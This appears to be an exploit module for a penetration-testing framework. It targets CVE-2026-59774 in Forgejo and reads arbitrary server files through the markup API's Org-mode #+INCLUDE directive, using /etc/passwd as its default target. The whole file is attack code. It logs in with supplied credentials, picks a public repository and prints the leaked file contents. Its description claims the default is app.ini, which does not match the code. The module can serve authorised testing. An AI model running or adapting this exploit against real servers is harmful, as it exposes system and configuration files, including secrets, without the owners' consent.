#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-59774 — Forgejo arbitrary file read via markup API."""

from kittysploit import *
from lib.protocols.http.gitea_probe import Gitea
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client, Gitea):
    __info__ = {
        "name": "Forgejo CVE-2026-59774 Org-mode file read",
        "description": (
            "Reads server files through POST /api/v1/markup with #+INCLUDE "
            "(Forgejo < 15.0.6 / 16.0.2). Defaults to app.ini disclosure path."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-59774"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-59774"],
        "tags": ["forgejo", "gitea", "lfi", "cve-2026-59774"],
        "agent": {
            "approval_required": True,
            "produces": ["sensitive_data"],
            "chain": {"suggested_followups": ["scanner/http/forgejo_cve_2026_59774_detect"]},
        },
    }

    username = OptString("", "Forgejo/Gitea username", required=True)
    password = OptString("", "Password", required=True)
    repo = OptString("", "owner/repo (auto-pick public if empty)", required=False)

    _DEFAULT_PATH = "/etc/passwd"

    def run(self):
        user = str(self.username or "").strip()
        pwd = str(self.password or "")
        repo = str(self.repo or "").strip()
        if not repo:
            repo = self.gitea_first_public_repo(user, pwd)
        if not repo:
            print_error("No public repository — set repo owner/name")
            return False
        code, content = self.gitea_markup_org_include(user, pwd, repo, self._DEFAULT_PATH)
        if code == 401:
            print_error("Authentication failed")
            return False
        if code != 200 or not content.strip():
            print_error("Markup read failed (patched or path inaccessible)")
            return False
        print_success(f"Read {self._DEFAULT_PATH} via {repo} ({len(content)} bytes)")
        print_status(content[:1200])
        self.set_info(severity="critical", cve="CVE-2026-59774", repo=repo, bytes=len(content))
        return True